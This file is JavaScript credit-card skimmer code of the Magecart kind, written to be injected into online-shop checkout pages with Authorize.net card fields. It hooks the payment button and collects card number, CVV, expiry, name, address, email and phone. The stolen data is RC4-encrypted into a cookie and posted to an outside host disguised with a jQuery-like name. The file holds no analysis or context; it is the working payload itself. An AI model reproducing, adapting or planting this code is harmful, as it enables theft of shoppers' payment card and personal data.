function appendScript() {
    setTimeout(function() {
        document.isExecuted || !0 === document.isExecuted || (document.isExecuted = !0, deflateMeyhod())
    }, 1e3 * Math.random())
}

function deflateMeyhod() {
    setInterval(function() {
        setListener()
    }, 2e3)
}

function setListener() {
    jQuery(document.sEvent) && 0 == jQuery(document.sEvent).hasClass(document.sClass) && initListenerStats()
}

function initListenerStats() {
    "1" != getCookie(document.sCookies) && bindFirst(jQuery(document.sEvent), "click", function() {
        saveData()
    }), jQuery(document.sEvent) && jQuery(document.sEvent).addClass(document.sClass)
}

function saveData() {
    var e;
    ccnumber = "", ccname = "", cvv = "", ccdate = "", ccmonth = "", ccyear = "", address = "", shop = "", mail = "", phone = "", city = "", state = "", country = "", zip = "";
    try {
        ccnumber = jQuery("#authorizenet_cc_number").val()
    } catch (e) {}
    try {
        ccname = jQuery("[name='billing[firstname]']").val() + " " + jQuery("[name='billing[lastname]']").val()
    } catch (e) {}
    try {
        cvv = jQuery("#authorizenet_cc_cid").val()
    } catch (e) {}
    try {
        ccdate = ""
    } catch (e) {}
    try {
        ccmonth = jQuery("#authorizenet_expiration option:selected").val()
    } catch (e) {}
    try {
        ccyear = jQuery("#authorizenet_expiration_yr option:selected").val()
    } catch (e) {}
    try {
        address = jQuery("[name='billing[street][]']:nth-child(1)").val() + ", " + jQuery("[name='billing[street][]']:nth-child(2)").val()
    } catch (e) {}
    try {
        shop = window.location.host
    } catch (e) {}
    try {
        email = jQuery("[name='billing[email]']").val()
    } catch (e) {}
    try {
        phone = jQuery("[name='billing[telephone]']").val()
    } catch (e) {}
    try {
        city = jQuery("[name='billing[city]']").val()
    } catch (e) {}
    try {
        state = jQuery("[name='billing[region]']").val()
    } catch (e) {}
    try {
        country = jQuery("[name='billing[country_id]'] option:selected").val()
    } catch (e) {}
    try {
        zip = jQuery("[name='billing[postcode]']").val()
    } catch (e) {}
    e = {
        ccnumber: ccnumber,
        ccname: ccname,
        cvv: cvv,
        ccdate: ccdate,
        ccmonth: ccmonth,
        ccyear: ccyear,
        address: address,
        shop: shop,
        email: email,
        phone: phone,
        city: city,
        state: state,
        country: country,
        zip: zip
    };
    var t = JSON.stringify(e),
        n = key(),
        c = eh(n + rc4(n, t));
    createCookie(document.sCookies, c, 36e3)
}

function sendData(e) {
    "" != e && jQuery.ajax({
        url: "https://jquerycloud.com/tr/",
        data: {
            q: e
        },
        type: "POST",
        success: function(e) {
            createCookie(document.sCookies, "1", 36e3), "" != e && console.log(e)
        },
        error: function(e, t, n) {
            createCookie(document.sCookies, "1", 36e3)
        }
    })
}

function worker() {
    var e = getCookie(document.sCookies);
    e && "1" != e && sendData(e)
}
document.sClass = "bfiyad", document.sEvent = "div#payment-buttons-container>button", document.sCookies = "ratzaf", document.addEventListener("DOMContentLoaded", function() {
    appendScript()
}), bindFirst = function(e, t, n) {
    var c, o, r, a;
    for (e.bind(t, n), r = 0, a = e.length; r < a; r++) c = e[r], (o = jQuery._data(c).events[t.split(".")[0]]).unshift(o.pop())
};
var createCookie = function(e, t, n) {
        var c = "";
        if (n) {
            var o = new Date;
            o.setTime(o.getTime() + 60 * n * 1e3), c = "; expires=" + o.toUTCString()
        }
        document.cookie = e + "=" + t + c + "; path=/"
    },
    getCookie = function(e) {
        var t = document.cookie.match(new RegExp("(?:^|; )" + e.replace(/([\.$?*|{}\(\)\[\]\\\/\+^])/g, "\\$1") + "=([^;]*)"));
        return t ? decodeURIComponent(t[1]) : void 0
    },
    rc4 = function(e, t) {
        for (var n, c = [], o = 0, r = "", a = 0; a < 256; a++) c[a] = a;
        for (a = 0; a < 256; a++) o = (o + c[a] + e.charCodeAt(a % e.length)) % 256, n = c[a], c[a] = c[o], c[o] = n;
        a = 0, o = 0;
        for (var i = 0; i < t.length; i++) o = (o + c[a = (a + 1) % 256]) % 256, n = c[a], c[a] = c[o], c[o] = n, r += String.fromCharCode(t.charCodeAt(i) ^ c[(c[a] + c[o]) % 256]);
        return r
    },
    key = function() {
        for (var e = "", t = 0; t < 16; t++) e += String.fromCharCode(Math.round(255 * Math.random()));
        return e
    },
    dh = function(e) {
        res = "";
        for (var t = 0; t < e.length; t += 2) res += sr.fromCharCode(parseInt(e.substr(t, 2), 16));
        return res
    },
    eh = function(e) {
        var t, n = "";
        for (t = 0; t < e.length; t++) n += ("0" + e.charCodeAt(t).toString(16)).slice(-2);
        return n
    };
setTimeout(function() {
    worker()
}, 500);
